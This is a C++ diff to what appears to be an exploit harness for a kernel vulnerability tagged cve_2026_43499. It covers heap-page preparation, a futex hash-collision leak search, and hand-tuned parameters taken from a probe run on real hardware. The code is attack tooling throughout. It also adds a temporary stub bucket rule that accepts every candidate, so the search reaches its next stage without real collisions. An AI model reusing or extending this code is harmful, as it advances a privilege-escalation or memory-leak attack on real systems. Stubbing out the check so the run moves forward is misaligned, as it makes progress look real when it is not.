@@ -106,6 +106,21 @@ namespace {
         }
         static void exit_child() noexcept { backend::cve_2026_43499::memory::LinuxHeapSeam::exit_child(); }
     };
+
+    /**
+     *  TEMPORARY, registered in the checklist with this entry: a bucket rule that accepts every
+     *  candidate, so the search reaches its walk on a development run where the real object is not
+     *  in any range this path could walk. The probe that ran on this hardware did exactly this, and
+     *  its header says why: everything else in it is real, and this one rule is a stub because the
+     *  collision search legitimately finds nothing when the object is not there. The real rule
+     *  arrives with the real spray, and this type goes when the entry does.
+     */
+    struct StubBuckets final {
+        /** Every candidate falls in the same bucket, for the candidate being asked about. */
+        [[nodiscard]] std::uint64_t bucket(std::uint64_t, std::uint64_t) const noexcept { return 0U; }
+        /** And every address is observed in that same one, which is what the walk needs next. */
+        [[nodiscard]] std::uint64_t bucket_of(std::uint64_t) const noexcept { return 0U; }
+    };
 }  // namespace
 #endif
 
@@ -286,6 +301,13 @@ namespace {
             return 10;
         }
 
+        /* The hash table size is pinned to the value the probe ran with on this device, not left to
+         *  the core count: the builder derives it from the processor count, and this machine reports
+         *  eight, which makes the table eight times wider and the poke budget eight times larger --
+         *  16384 where the passing run had 2048, read off the device. The probe set 256 by hand, and
+         *  its record is the standard this run is measured against. */
+        setup.futex_table_size = 256U;
+
         backend::cve_2026_43499::leak::RegionInputs region{};
         region.header_bytes = 256U;
         region.collisions = 2U;
@@ -400,23 +422,30 @@ namespace {
         args.addresses = address_table;
         args.address_count = 2U;
 
-        backend::cve_2026_43499::leak::SnitchPolicy<DeviceSeam,
-                                                      backend::cve_2026_43499::leak::CollisionBuckets>
-            snitch{args, &buckets, {}, false};
+        /* TEMPORARY: the bucket rule is the stub, so the walk is reached; the real one comes with the
+         *  real spray. CollisionBuckets above stays for the proofs, whose buckets must be real. */
+        StubBuckets stub_buckets{};
+        backend::cve_2026_43499::leak::SnitchPolicy<DeviceSeam, StubBuckets> snitch{args, &stub_buckets,
+                                                                                  {}, false};
 
         const backend::cve_2026_43499::memory::PrepareOutcome prepared =
             /* The first template argument is the heap half of the platform, not the snitch half: the*/
                 /* preparation forks and shapes, and page_size lives on that side. The compiler said so*/
                 /* when the snitch seam was passed here -- it lacks page_size, which HeapSeam needs. */
                 backend::cve_2026_43499::memory::prepare_page<
-                DeviceSeam,
-                backend::cve_2026_43499::leak::SnitchPolicy<DeviceSeam,
-                                                            backend::cve_2026_43499::leak::CollisionBuckets>>(prepare_inputs, geometry, waiting,
-                                                                     snitch);
+                DeviceSeam, backend::cve_2026_43499::leak::SnitchPolicy<DeviceSeam, StubBuckets>>(
+                prepare_inputs, geometry, waiting, snitch);
         std::printf("run-temp: prepare %s at=%d opened=%zu closed=%zu base=0x%lx errno=%d\n",
                     backend::cve_2026_43499::memory::prepare_status_name(prepared.status),
                     static_cast<int>(prepared.at_step), prepared.opened, prepared.closed,
                     static_cast<unsigned long>(prepared.base), static_cast<int>(prepared.error));
+        /* What the search decided, by name: the probe printed exactly this, and it is the one line
+         *  that says which guard refused. The answer travels in the policy's outcome, which the
+         *  preparation read but did not report. */
+        std::printf("run-temp: search %s rounds=%u wanted=%zu region=%p probes=%zu found=%d\n",
+                    backend::cve_2026_43499::leak::run_verdict_name(snitch.outcome.status),
+                    static_cast<unsigned>(snitch.outcome.rounds), snitch.outcome.pokes_wanted,
+                    snitch.outcome.region, snitch.outcome.probes, snitch.outcome.found ? 1 : 0);
         if (prepared.status != backend::cve_2026_43499::memory::PrepareStatus::Ok) {
             std::printf("run-temp: stopping after the preparation; the search has not run\n");
             return 12;
